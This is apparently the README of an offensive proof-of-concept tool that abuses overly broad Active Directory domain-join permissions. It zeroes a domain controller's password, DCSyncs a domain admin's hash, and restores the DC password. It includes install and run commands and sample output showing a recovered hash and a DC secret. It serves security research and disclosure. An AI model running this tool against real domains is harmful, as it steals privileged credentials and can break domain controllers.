# SetZeroSync

POC to demonstrate what can be done when domain join permissions are over provisioned. More details can be found [here](https://specterops.io/blog/2025/10/01/writeaccountrestrictions-war-what-is-it-good-for/). 

## Disclaimer  

Don't run this in prod. This uses vanilla Impacket libraries which are heavily signatured. EDR will block you when recovering credentials. The result is a bricked DC. 

## TL:DR;

Don't run in prod. The permissions below are the minimum [recommended](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/active-directory-domain-join-permissions) to delegate domain join permissions in AD. If delegated at the domain root, the permission is inherited by domain controllers. This can be abused to force reset a DC's password, DCSYNC a DA credential, and then restore the previous password. 



```
Read
Read all properties
List contents
Allowed to authenticate
Change password
Reset password
Validated write to DNS host name
Validated write to service principal name
Write account restrictions (for updating UserAccountControl)
```

# Installation

```
git clone https://github.com/garrettfoster13/SetZeroSync.git
cd SetZeroSync
uv sync
```


# Example output

```
➜  SetZeroSync git:(main) ✗ uv run setzerosync.py -u domain_join -p password -d unsigned-sh0rt.net -dc-ip 10.6.10.10 -dc dc01\$ -da domainadmin
[*] Searching for DC...
[*] Setting empty password on DC
[+] DC password zeroed out!
[*] Searching for target domain admin...
[+] Got target user domainadmin hash: 8846f7eaee8fb117ad06bdd830b7586c
[*] Trying to get DC hex password...
[*] Dumping LSA secrets only
[+] Got target DC hex pass!
[+] Got DC hexpass: 1af70b45ed6bbb3a8eb7d7c4baa2d197bb1d3c35d08aa0087dc456240b464cd377ab335861b647c3a3f60dd898cbbd88dc2549dd8264fa0c043d116e3aa46c719c9a73483d94e8d3943ae42ffe0cd92de40442855dfe422b8e6efee838eebcbb511e43649c29f60ebb3bacf801d4a3ba4d65ff0e6e2572a6f5d2086a742d1143e9a78e136f9ffc67f0bd38a0852760d63e21eaf25a7b8fdd8bb27a914bf67925dfef381abc102ad0c50e1792da26ab7c0169243bc339c6d0a39f4fdd3d14d69f5cf0dfcdc6699d726a96658022a550df8eeeec0167eec7935e559ecc1e9c69a15d547252e03b58b3b0863cef7e2995a4
[*] Restoring DC password with hexpass
[+] DC password restored successfully!
```





![alt text](./images/wholeflow.png)